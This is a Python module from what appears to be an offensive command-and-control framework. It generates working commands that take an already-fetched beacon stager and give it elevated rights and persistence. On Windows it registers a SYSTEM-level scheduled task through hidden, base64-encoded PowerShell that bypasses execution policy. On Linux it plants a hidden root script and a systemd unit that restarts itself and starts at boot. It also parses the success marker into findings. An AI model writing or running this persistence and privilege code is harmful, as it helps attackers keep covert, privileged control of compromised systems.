"""
inject.py — privileged execution for the beacon.

"Beacon injection" here means: get the ALREADY-FETCHED payload running with
elevated rights, and keep it running after the operator walks away. The
payload is a COMMAND (the resilient C2 stager, or a beacon command), not
shellcode, so this does NOT write bytes into a remote RWX page and call
CreateRemoteThread: that API wants OPCODES, and a command line is not one.
Handing the CPU the ASCII bytes of a command would start a thread on an
instruction stream that is not even a valid program — the beacon it was
supposed to host never runs. Real threadless injection is the beacon's own
`inject` capability (`apc_injection.h`), which sends actual shellcode over
APC after the foothold exists.

What DOES work from a command, and is what this module emits:
  * Windows: a SYSTEM / ONLOGON scheduled task (highest token) run once now.
    It survives the operator leaving the target, and because the payload is
    the RESILIENT stager, the C2 being down at injection time is not fatal —
    the stager retries on its own until the listener answers.
  * Linux: a root-owned systemd unit, written through a script file and
    enabled at boot. (The unit runs ``/bin/sh <script>``: an arbitrary
    command line is not a valid ``ExecStart=``, which is why the payload is
    staged to a file first.)

The injected session is the same beacon payload that called back earlier.
"""

from __future__ import annotations

import base64
from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel

# deterministic so the cleanup section can find and remove it
_INJECT_TASK_WIN = "PhantomInject"
_INJECT_SCRIPT_NIX = "/root/.cache/.p/i"
_INJECT_UNIT_NIX = "/etc/systemd/system/phantom-inject.service"


def _ps_encoded(script: str) -> str:
    """A powershell one-liner that carries `script` base64 UTF-16-LE.

    Passing the script encoded is quoting-proof: no quote, newline or `$`
    in the script can break the shell that starts it.
    """
    return ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
            + base64.b64encode(script.encode("utf-16-le")).decode())


def inject_beacon_command(os_name: str, payload: str,
                          target_process: str = "winlogon") -> str:
    """Command that runs ``payload`` with elevated rights and PERSISTS.

    ``target_process`` is accepted for call-site compatibility; a command is
    not injected into a process (see the module docstring), so it is only
    reflected in the reported identity when the payload itself mentions one.
    """
    if "windows" in os_name.lower():
        action = _ps_encoded(payload)          # the payload, run as a command
        # The action is single-quoted (base64 is quote-safe), so no inner
        # quoting can escape into the schtasks argument list.
        script = (
            "$a='" + action + "';"
            "schtasks /create /f /tn '" + _INJECT_TASK_WIN + "' /sc onlogon "
            "/ru SYSTEM /rl HIGHEST /tr \"$a\" | Out-Null;"
            "schtasks /run /tn '" + _INJECT_TASK_WIN + "' | Out-Null;"
            "echo INJECT_OK pid=SYSTEM"
        )
        return _ps_encoded(script)

    # POSIX: stage the payload to a script and let a systemd unit run it.
    # `ExecStart=<command line>` is invalid for systemd, so the unit starts
    # `/bin/sh <script>` — the payload keeps its own quoting intact.
    unit = (
        "[Unit]\nDescription=Phantom\n"
        "[Service]\n"
        f"ExecStart=/bin/sh {_INJECT_SCRIPT_NIX}\n"
        "Restart=always\n"
        "[Install]\nWantedBy=multi-user.target\n"
    )
    payload_b64 = base64.b64encode(payload.encode()).decode()
    unit_b64 = base64.b64encode(unit.encode()).decode()
    return (
        f"mkdir -p /root/.cache/.p && "
        f"echo {payload_b64} | base64 -d > {_INJECT_SCRIPT_NIX} && "
        f"chmod +x {_INJECT_SCRIPT_NIX} && "
        f"echo {unit_b64} | base64 -d > {_INJECT_UNIT_NIX} && "
        f"systemctl daemon-reload && "
        f"systemctl enable --now phantom-inject.service && "
        f"echo INJECT_OK pid=systemd"
    )


def inject_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """injection is confirmed when the payload reports INJECT_OK with the
    identity it now runs as (a SYSTEM task, a root unit)."""
    if "INJECT_OK" not in output:
        return []
    proc = "systemd"
    if "pid=" in output:
        proc = output.split("pid=")[1].split()[0].strip()
    method = "scheduled_task" if proc.upper() == "SYSTEM" else "systemd_unit"
    return [Finding(kind="injection", key=proc,
                    value={"target_process": proc, "method": method,
                           "os": slots.get("os", "")},
                    confidence=0.9, source="inject_beacon",
                    evidence=output.strip()[:200])]
